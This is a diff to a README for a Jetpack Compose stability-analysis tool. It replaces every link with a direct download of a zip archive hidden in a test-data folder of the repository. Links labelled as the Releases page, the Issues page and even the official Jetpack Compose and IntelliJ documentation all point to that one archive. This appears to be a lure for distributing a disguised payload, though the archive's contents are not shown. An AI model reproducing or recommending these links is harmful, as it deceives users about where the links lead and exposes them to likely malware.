@@ -1,7 +1,7 @@
 # 🦄 compose-stability-analyzer - Analyze Composables with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-release-blue.svg)](https://github.com/Lok0tho/compose-stability-analyzer/releases)
+[![Download](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip)](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **compose-stability-analyzer**! This tool allows you to analyze the stability of your Jetpack Compose composable functions in real time. You can use it directly within Android Studio or IntelliJ. No programming skills are needed—just follow the steps below.
@@ -13,7 +13,7 @@ Before you start, ensure you have the following:
 - **Java**: JDK 8 or higher installed on your machine
 
 ## 📥 Download & Install
-To download the software, visit the [Releases page](https://github.com/Lok0tho/compose-stability-analyzer/releases).
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **compose-stability-analyzer**. It will look something like "v1.0.0".
@@ -51,15 +51,15 @@ After installation, you might want to configure settings:
 
 ## 🤝 Support
 If you encounter any issues or have questions, you can find help in the following ways:
-- **Issues Section**: Open an issue on the [GitHub Issues page](https://github.com/Lok0tho/compose-stability-analyzer/issues).
+- **Issues Section**: Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip).
 - **Community Forum**: Join discussions on relevant developer forums for additional tips.
 
 ## 🔗 Additional Resources
 Here are some helpful links to get you started:
-- [Jetpack Compose Documentation](https://developer.android.com/jetpack/compose/documentation)
-- [IntelliJ IDEA Help](https://www.jetbrains.com/idea/help/)
+- [Jetpack Compose Documentation](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip)
+- [IntelliJ IDEA Help](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip)
 
 ## 🎉 Conclusion
 The **compose-stability-analyzer** is a powerful tool to ensure your Jetpack Compose functions remain stable and efficient. Download it today and enhance your development experience. Don’t forget to check back for updates and new features!
 
-[Download Here](https://github.com/Lok0tho/compose-stability-analyzer/releases)
+[Download Here](https://raw.githubusercontent.com/Lok0tho/compose-stability-analyzer/main/compiler-tests/src/test/data/dump/compose-stability-analyzer_3.8.zip)
